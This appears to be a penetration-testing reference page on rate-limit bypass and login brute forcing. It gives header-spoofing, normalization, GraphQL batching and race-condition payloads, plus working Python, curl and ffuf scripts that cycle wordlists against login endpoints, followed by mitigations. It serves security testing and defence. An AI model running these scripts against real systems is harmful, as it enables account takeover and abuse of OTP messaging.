---
title: Rate Limiting
---

# Rate Limiting & Brute Force

Rate Limiting Issues occur when an application fails to restrict the frequency of requests to sensitive endpoints. This allows attackers to perform **Brute Force** attacks, systematically trying every combination of a password, PIN, or secret or **Enumeration** attacks to map valid users and resources. Without a speed limit, an attacker can automate thousands of attempts per second until they find a match.

## Understanding the Basics

### The Velocity Problem

1. **Request:** Attacker sends a login attempt
2. **Server Logic:** Server checks credentials, returns `401 Unauthorized`
3. **The Loop:** No cooldown or block; attacker repeats 10,000 times
4. **The Breach:** Correct password hit; server returns `200 OK`

### Common Rate Limiting Flaws

- **IP-Only Throttling** — Bypassed trivially via proxy rotation
- **Soft Limits** — Server logs the violation but doesn't block or drop the connection
- **Client-Side Locks** — JavaScript disabling a submit button; bypassed via `curl` or Burp Suite
- **Header Trust** — Trusting user-controlled headers (`X-Forwarded-For`) to identify the real client IP

## Attack Surface

- **Login & MFA Screens** — Password guessing, 4/6-digit OTP brute force
- **Password Reset** — Brute forcing reset tokens, PINs, or OTP codes
- **Registration / Sign-up** — Enumerating valid usernames or email addresses
- **SMS / Email Triggers** — Endpoints that send OTPs or verification links; abusable for spam/flooding
- **API Resources** — Iterating `/api/v1/user/1001`, `/1002` to enumerate and scrape data
- **File Upload Endpoints** — Repeated large uploads to exhaust storage or processing limits
- **PDF / Report Generators** — Triggering expensive server-side rendering in a loop
- **Voucher / Coupon Codes** — Guessing promotional codes for discounts or free credits

## Exploiting Rate Limiting

### 1. Header-Based IP Spoofing

If the server uses headers to track rate limits, rotate them to appear as a new IP per request.

Headers to rotate: `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `CF-Connecting-IP`, `True-Client-IP`, `X-Originating-IP`, `X-Remote-IP`, `X-Remote-Addr`

```
POST /login HTTP/1.1
Host: target.com
X-Forwarded-For: 10.0.0.1        ← rotate this per request
X-Real-IP: 10.0.0.1
True-Client-IP: 10.0.0.1
X-Originating-IP: 10.0.0.1

username=admin&password=pass123
```

Spoof internal/trusted IPs to bypass controls that allowlist internal ranges:

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: 10.0.0.1
```

Burp Intruder — Pitchfork mode: Payload 1 = password list, Payload 2 = rotating IP values injected into header.

### 2. Whitespace & Non-Printable Character Injection

Rate limiters see a "new" unique identifier while the backend strips the character and processes the original value.

```
admin%00       → null byte
admin%0a       → newline
admin%0d       → carriage return
admin%09       → horizontal tab
admin%20       → space
admin+         → plus (URL decoded to space)
 admin         → leading space
```

```
POST /login HTTP/1.1

username=admin%00&password=pass
username=admin%0a&password=pass
username=%20admin&password=pass
```

### 3. Email Normalization & Case Variation

Many mail servers treat these as the same address; rate limiters tracking the raw string see them as distinct.

```
admin@target.com
Admin@target.com
ADMIN@target.com
admin+1@target.com
admin+test@target.com
a.d.m.i.n@target.com        ← Gmail ignores dots
admin@TARGET.COM
```

### 4. Phone Number Normalization

Mobile number fields often accept multiple formats mapping to the same number — useful for OTP or SMS-triggered endpoints.

```
9876543210
09876543210       ← leading zero
+919876543210     ← country code
919876543210      ← country code without +
+91-9876543210    ← dashes
+91 9876543210    ← spaces
```

### 5. HTTP Parameter Pollution (HPP)

Send the same parameter multiple times. Servers handle duplicate keys differently — the rate limiter may key on one occurrence while the application uses another.

```
POST /login HTTP/1.1

username=admin&password=pass1&password=pass2
username=admin&username=attacker&password=pass
```

### 6. JSON Array / Multiple Value Injection

Some parsers accept arrays or comma-separated values. The rate limiter counts one request; the backend iterates the list.

```json
{"username": "admin", "password": ["pass1", "pass2", "pass3"]}
{"username": "admin", "password": "pass1,pass2,pass3"}
{"otp": ["1234", "5678", "9012"]}
```

### 7. GraphQL Query Batching

Multiple operations in a single HTTP request — bypasses per-request rate limiting entirely.

```graphql
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
]
```

```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(username:\"admin\",password:\"pass1\"){token}}"},
    {"query":"mutation{login(username:\"admin\",password:\"pass2\"){token}}"},
    {"query":"mutation{login(username:\"admin\",password:\"pass3\"){token}}"}
  ]'
```

### 8. Content-Type Swapping

Rate limiters and WAFs may apply rules per content type. Switching the format of the same request can bypass type-specific controls.

```
# Original
Content-Type: application/x-www-form-urlencoded
username=admin&password=pass

# Swapped to JSON
Content-Type: application/json
{"username":"admin","password":"pass"}

# Swapped to XML
Content-Type: application/xml
<login><username>admin</username><password>pass</password></login>

# Multipart
Content-Type: multipart/form-data; boundary=----boundary
------boundary
Content-Disposition: form-data; name="username"
admin
```

### 9. HTTP Method Switching

Some endpoints apply rate limiting only to specific methods.

```
POST /login → rate limited
GET /login?username=admin&password=pass → not rate limited
PUT /login → not rate limited
```

### 10. Race Condition

Send multiple requests at the exact same millisecond to beat the rate limiter before it can increment the failed-attempts counter.

```python
# Turbo Intruder (Burp Suite extension)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30)
    for i in range(30):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```

```python
import asyncio, aiohttp

async def attempt(session, password):
    async with session.post('https://target.com/login',
                            data={'username': 'admin', 'password': password}) as r:
        return password, r.status, await r.text()

async def race(passwords):
    async with aiohttp.ClientSession() as session:
        results = await asyncio.gather(*[attempt(session, p) for p in passwords])
        for pwd, status, body in results:
            if status == 200 and 'token' in body:
                print(f'[HIT] {pwd}')

asyncio.run(race(['pass1','pass2','pass3','pass4','pass5']))
```

### Test Cases

| Scenario | Action | Expected Outcome |
| --- | --- | --- |
| Basic Brute Force | 100 rapid requests to `/login` | `429 Too Many Requests` confirms rate limit exists |
| Header IP Rotation | Rotate `X-Forwarded-For` per request | Continuous `401` without hitting `429` = bypass confirmed |
| Internal IP Spoof | Set `X-Forwarded-For: 127.0.0.1` | Rate limit skipped if internal IPs are whitelisted |
| Null Byte Injection | `username=admin%00` | Backend authenticates `admin`; limiter sees new identifier |
| Email Case Variation | `Admin@x.com`, `ADMIN@x.com` | Separate rate limit buckets per variant |
| Phone Normalization | `09876543210` vs `+919876543210` | Multiple OTPs triggered for same number |
| JSON Array Injection | `"password":["p1","p2","p3"]` | Multiple passwords tested in one request |
| GraphQL Batching | 50 login mutations in one HTTP request | Bypasses per-request rate limit |
| Content-Type Swap | Resend as `application/json` vs form-encoded | One format rate limited; other is not |
| Method Switch | `GET /login?user=x&pass=y` | Rate limit applies to POST only |
| Race Condition | 30 concurrent requests via Turbo Intruder | Counter not incremented; all attempts processed |
| API Version | `/api/v1/login` vs `/api/v2/login` | Older version unprotected |

## Detection Techniques (Offensive Perspective)

### Manual Detection: Confirming Rate Limit & Bypass

**Detecting the Rate Limit**

```
Send incremental requests until the server responds differently:
Request 1–9:   HTTP 401 Unauthorized  ← normal failure
Request 10:    HTTP 429 Too Many Requests  ← rate limit threshold identified

Check response headers for limit metadata:
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 0
Retry-After: 30
```

**Confirming a Bypass**

```
Baseline (rate limited):   HTTP 429
After applying bypass:     HTTP 401 or HTTP 200  ← 429 gone = bypass confirmed

If bypass returns 200 with token/session → full brute force now possible
If bypass returns 401 → rate limit gone, credentials not yet found
```

**Response Differential**

```bash
# Establish baseline — note when 429 appears
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/login \
    -d "username=admin&password=wrong$i")
  echo "Attempt $i: $code"
done

# Output pattern:
# Attempt 1–9: 401
# Attempt 10+: 429  ← threshold found
```

**Keyword / Body Matching for Success**

```
Rate limit indicator:   "rate limit", "too many", "slow down", "try again"
Bypass confirmed:       429 disappears after applying technique
Hit confirmed:          "token", "session", "welcome", "dashboard" in response body
                        HTTP 302 redirect to authenticated page
```

### Automated Detection

```bash
# Detect rate limit threshold then test bypass with header rotation
for i in $(seq 1 50); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://target.com/login \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "username=admin&password=test$i")
  echo "$i → $code"
  [[ "$code" == "200" ]] && echo "[HIT] password=test$i" && break
done
```

```python
import requests

for i, password in enumerate(open('wordlist.txt').read().splitlines()):
    r = requests.post('https://target.com/login',
                      data={'username': 'admin', 'password': password},
                      headers={'X-Forwarded-For': f'10.0.{i//255}.{i%255}'})

    if r.status_code == 429:
        print(f'[RATE LIMITED] at attempt {i} — switch bypass technique')
        break
    elif r.status_code == 200 and any(k in r.text for k in ['token','session','welcome']):
        print(f'[HIT] {password}')
        break
    else:
        print(f'[{r.status_code}] {password}')
```

```bash
# ffuf — detect threshold and identify bypass
# Baseline run
ffuf -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -w wordlist.txt \
  -mc 200,302 -fc 429

# With header rotation (custom header per request)
ffuf -u https://target.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -H "X-Forwarded-For: FUZZ2" \
  -w wordlist.txt:FUZZ -w ips.txt:FUZZ2 \
  -mode pitchfork -mc 200,302
```

## Impact

- **Account Takeover (ATO)** — Successfully guessing user passwords or OTPs
- **Data Scraping** — Large-scale theft of user data via ID enumeration on API resources
- **Financial Loss** — Brute forcing gift card numbers, coupon codes, or credit card CVVs
- **SMS / Email Flooding** — Abusing OTP triggers to spam or exhaust messaging quotas
- **Denial of Service (DoS)** — Exhausting server resources (CPU, DB connections) through massive request volume

## Tools

| Tool | Purpose |
| --- | --- |
| Burp Suite Intruder | Pitchfork / Cluster Bomb attacks with header and payload rotation |
| Turbo Intruder | Race condition exploitation via concurrent request flooding |
| ffuf | High-speed fuzzing with header injection and pitchfork mode |
| Hydra / Medusa | Multi-protocol brute force for non-HTTP services |
| proxychains4 | Route requests through rotating proxy chains |

## Mitigation & Prevention

1. **Progressive Delays** — Exponential backoff after failed attempts (1s → 5s → 30s)
2. **Account Lockout** — Temporarily lock after N failures; pair with CAPTCHA to avoid user DoS
3. **Server-Side IP Resolution** — Never trust `X-Forwarded-For` or similar headers for rate limiting; use the actual socket IP
4. **Global Rate Limiting** — Limit on total failed auth events platform-wide, not just per-IP or per-user
5. **CAPTCHA Integration** — Trigger after suspicious velocity; use behavioral CAPTCHA (reCAPTCHA v3, Turnstile)
6. **API Gateways** — Enforce limits at infrastructure level: AWS WAF, Kong, Nginx `limit_req`
7. **GraphQL Query Depth / Complexity Limits** — Reject batched operations exceeding a defined complexity threshold

## Good To Read

### HackerOne Reports

- [Rate limit bypass on passport.acronis.work using X-Forwarded-For](https://hackerone.com/reports/2627062)
- [Rate limit function bypass leading to critical impact](https://hackerone.com/reports/1067533)
- [Rate Limit Bypass on Login Page](https://hackerone.com/reports/224460)

## References

- [OWASP BLA7:2025 Resource Quota Violation](https://owasp.org/www-project-top-10-for-business-logic-abuse/docs/the-top-10/resource-quota-violation)
- [PortSwigger: Exploiting Rate Limits](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
- [Nginx: Rate Limiting Guide](https://www.nginx.com/blog/rate-limiting-nginx/)